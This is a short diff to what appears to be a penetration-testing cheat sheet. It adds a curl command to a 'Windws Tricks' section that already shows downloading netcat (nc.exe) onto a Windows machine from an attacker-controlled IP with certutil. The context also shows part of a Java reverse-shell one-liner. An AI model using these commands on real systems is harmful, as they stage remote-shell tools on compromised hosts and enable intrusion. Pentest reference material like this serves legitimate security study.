@@ -375,6 +375,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 #### Windws Tricks
 ##### Download a file in Windows via certutil
 > 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
+> 1. *Windows 10* ```curl -o nc.exe http://192.168.49.176/nc.exe```
 
 ##### Download a file in Windows via FTP client 
 > 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
